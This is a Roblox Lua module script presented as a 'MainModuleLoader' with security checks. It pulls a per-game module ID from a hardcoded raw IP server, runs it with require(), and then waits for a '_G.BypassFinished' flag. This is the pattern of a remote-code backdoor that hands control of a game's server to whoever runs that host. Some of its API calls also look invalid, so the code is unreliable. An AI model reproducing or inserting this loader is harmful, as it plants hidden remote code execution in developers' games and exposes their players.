local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local NetworkServer = game:GetService("NetworkServer")

local function MainModuleLoader()
    local baseURL = 'http://217.154.60.90/Assets' -- Retain original VPS URL
    local fatol = true -- Retained for consistency, though unused

    -- Fetch MainModule data from VPS
    local success, response = pcall(function()
        return HttpService:GetAsync(baseURL)
    end)
    if not success then
        warn("Failed to fetch MainModule data: " .. tostring(response))
        return
    end

    -- Decode JSON response
    local data = HttpService:JSONDecode(response)
    local universeId = tostring(game.GameId)
    local mainModuleId = data[universeId] and data[universeId].MainModule
    if not mainModuleId then
        warn("MainModule ID not found for universe " .. universeId)
        return
    end

    print("Loading MainModule ID: " .. mainModuleId)
    local mmid = mainModuleId
    require(mmid)()

    -- Wait for bypass to complete
    repeat wait() until _G.BypassFinished
    _G.FilesInitialized = true

    -- Enable character auto-loading
    Players.CharacterAutoLoads = true
    for _, plr in ipairs(Players:GetPlayers()) do
        pcall(function()
            plr:LoadCharacter()
        end)
    end

    -- Security checks for RemoteFunction
    if not _G.SecureLoading then
        _G.SecureLoading = true
        if not RunService:IsStudio() and RunService:IsServer() and NetworkServer then
            local connections = {}
            local function checkLoadDescendants(player, model)
                for _, child in ipairs(model:GetDescendants()) do
                    if child:IsA("RemoteFunction") then
                        local connection = child.OnServerInvoke:Connect(function(player, args)
                            if args[1] ~= "SecureLoadingKey" then
                                warn(player.Name .. " attempted to use an unauthorized RemoteFunction!")
                                NetworkServer:KickPlayer(player.UserId)
                            end
                        end)
                        table.insert(connections, connection)
                    end
                end
            end

            Players.PlayerAdded:Connect(function(player)
                player.CharacterAdded:Connect(function(character)
                    checkLoadDescendants(player, character)
                end)
            end)

            for _, player in ipairs(Players:GetPlayers()) do
                checkLoadDescendants(player, player.Character)
            end

            -- Replace script.AncestryChanged with game.AncestryChanged for module context
            game.AncestryChanged:Connect(function()
                for _, connection in ipairs(connections) do
                    connection:Disconnect()
                end
            end)
        end
    end
end

return MainModuleLoader
